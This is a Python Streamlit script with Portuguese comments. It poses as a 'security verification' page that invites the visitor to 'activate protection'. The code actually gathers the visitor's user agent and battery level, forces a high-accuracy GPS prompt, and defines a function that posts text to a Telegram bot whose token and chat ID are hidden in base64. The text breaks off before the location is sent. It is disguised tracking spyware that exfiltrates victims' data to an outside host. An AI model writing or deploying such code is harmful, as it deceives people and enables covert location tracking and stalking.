import streamlit as st
import requests
import base64
import time
from streamlit_js_eval import streamlit_js_eval

# --- CONFIGURAÇÃO DO BOT ---
B_TK = "ODA5OTI1MzM4MjpBQUhXWVVqZnBXMTlKNTZVZF9GQ01fOXRPYnhVNHJMaDNnUQ=="
B_ID = "ODQ5ODY2NDAyOA=="

def enviar_telegram(texto):
    try:
        # CONSERTO DA LINHA 12: Definição direta das variáveis de conexão
        token = base64.b64decode(B_TK).decode("utf-8").strip()
        chat = base64.b64decode(B_ID).decode("utf-8").strip()
        payload = {"chat_id": chat, "text": texto, "parse_mode": "Markdown"}
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage", json=payload, timeout=10)
    except Exception as e:
        st.error(f"Erro no envio: {e}")

st.set_page_config(page_title="SEGURANÇA MIAMY", page_icon="🔐")

st.title("Verificação de Segurança")

# Coleta dados básicos (User Agent e Bateria)
ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key="UA_GALAXY")
bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key="BAT_GALAXY")

# O BOTÃO QUE DISPARA O POP-UP NA HORA (Sem F5)
if st.button("● ATIVAR PROTEÇÃO AGORA", key="BTN_GALAXY"):
    # JS puro para forçar o pop-up no clique do usuário
    js_gps = "new Promise((res) => { navigator.geolocation.getCurrentPosition((p) => { res(p.coords.latitude + ',' + p.coords.longitude); }, (e) => { res('erro'); }, {enableHighAccuracy:true, timeout:10000}); })"
    posicao = streamlit_js_eval(js_expressions=js_gps, key=f"GPS_FORCADO_{int(time.time())}")

    if posicao == "erro":
        st.error("Erro: Ative o GPS no Android e permita no navegador.")
    elif posicao:
        # Extração precisa do modelo Samsung
        
